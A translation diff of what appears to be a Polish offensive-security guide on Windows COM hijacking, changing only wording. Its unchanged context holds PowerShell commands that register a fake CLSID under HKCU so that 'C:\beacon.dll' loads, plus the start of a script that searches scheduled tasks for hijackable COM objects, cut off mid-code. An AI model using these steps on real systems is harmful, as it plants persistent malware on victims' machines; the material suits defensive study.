@@ -10,7 +10,7 @@ Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników, **COM Hij
 - gdzie _Wynik_ to **NAME NOT FOUND**.
 - i _Ścieżka_ kończy się na **InprocServer32**.
 
-Gdy zdecydujesz, który nieistniejący COM chcesz udawać, wykonaj następujące polecenia. _Bądź ostrożny, jeśli zdecydujesz się udawać COM, który jest ładowany co kilka sekund, ponieważ to może być przesadą._
+Gdy zdecydujesz, który nieistniejący COM chcesz naśladować, wykonaj następujące polecenia. _Bądź ostrożny, jeśli zdecydujesz się naśladować COM, który jest ładowany co kilka sekund, ponieważ to może być przesadą._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -18,7 +18,7 @@ New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F
 ```
 ### Hijackowalne komponenty COM harmonogramu zadań
 
-Windows Tasks używają niestandardowych wyzwalaczy do wywoływania obiektów COM, a ponieważ są wykonywane przez Harmonogram zadań, łatwiej przewidzieć, kiedy będą uruchamiane.
+Zadania systemu Windows używają niestandardowych wyzwalaczy do wywoływania obiektów COM, a ponieważ są one wykonywane przez Harmonogram zadań, łatwiej jest przewidzieć, kiedy zostaną uruchomione.
 
 <pre class="language-powershell"><code class="lang-powershell"># Pokaż CLSID COM
 $Tasks = Get-ScheduledTask
